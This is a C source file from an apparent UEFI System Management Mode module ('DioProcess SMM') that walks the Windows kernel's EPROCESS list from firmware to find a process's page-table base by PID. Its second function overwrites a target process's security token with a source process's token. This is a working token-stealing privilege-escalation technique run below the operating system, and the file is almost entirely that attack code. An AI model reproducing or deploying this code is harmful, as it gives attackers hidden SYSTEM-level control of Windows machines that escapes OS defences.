/** @file
  DioProcess SMM — NT kernel structure operations implementation.
**/

#include <Uefi.h>
#include <Library/UefiLib.h>

#include "Globals.h"
#include "Defs.h"
#include "Memory.h"
#include "Serial.h"
#include "Nt.h"

extern DIOPROCESS_LIVE_SESSION_INFO gLiveSession;

UINT64
EFIAPI
NtGetDirBaseByPid(
    IN  UINT64  Pid,
    IN  VOID   *SysEprocess,
    IN  UINT64  SysDirBase,
    OUT VOID  **TargetEprocess
    )
{
    if (!SysEprocess || !SysDirBase || !Pid)
        return 0;

    VOID *CurrentEntry = SysEprocess;
    VOID *UnmappedEprocess = NULL;

    do {
        UINT64 MappedEprocess = MemMapVirtualAddress(CurrentEntry, SysDirBase, &UnmappedEprocess);
        if (MappedEprocess == 0) {
            SerialPrint("[ SMM ] Unable to map EPROCESS structure\r\n");
            return 0;
        }

        UINT64 CurrentPid = *(UINT64 *)(MappedEprocess + EPROCESS_PID_OFFSET);

        if (CurrentPid == Pid) {
            UINT64 DirBase = *(UINT64 *)(MappedEprocess + EPROCESS_DIR_BASE_OFFSET);

            if (TargetEprocess)
                *TargetEprocess = UnmappedEprocess;

            MemRestoreSmramMappings();
            return DirBase;
        }

        UINT64 Flink = *(UINT64 *)(MappedEprocess + EPROCESS_FLINK_OFFSET);
        CurrentEntry = (VOID *)(Flink - EPROCESS_FLINK_OFFSET);

        MemRestoreSmramMappings();

    } while (CurrentEntry != SysEprocess);

    SerialPrint("[ SMM ] Process not found in the list\r\n");
    return 0;
}

EFI_STATUS
EFIAPI
NtExchangeProcessToken(
    IN VOID *SourceEprocess,
    IN VOID *TargetEprocess
    )
{
    if (!SourceEprocess || !TargetEprocess)
        return EFI_INVALID_PARAMETER;

    SerialPrint("[ SMM ] Exchanging process tokens\r\n");

    UINT64 MappedSource = MemProcessOutsideSmramPhysMemory((UINT64)SourceEprocess);
    if (MappedSource == 0) {
        SerialPrint("[ SMM ] Unable to map source EPROCESS\r\n");
        return EFI_ABORTED;
    }

    UINT64 SourceToken = *(UINT64 *)(MappedSource + EPROCESS_TOKEN_OFFSET);
    MemRestoreSmramMappings();

    UINT64 MappedTarget = MemProcessOutsideSmramPhysMemory((UINT64)TargetEprocess);
    if (MappedTarget == 0) {
        SerialPrint("[ SMM ] Unable to map target EPROCESS\r\n");
        return EFI_ABORTED;
    }

    *(UINT64 *)(MappedTarget + EPROCESS_TOKEN_OFFSET) = SourceToken;
    MemRestoreSmramMappings();

    SerialPrint("[ SMM ] Token exchanged successfully\r\n");
    return EFI_SUCCESS;
}
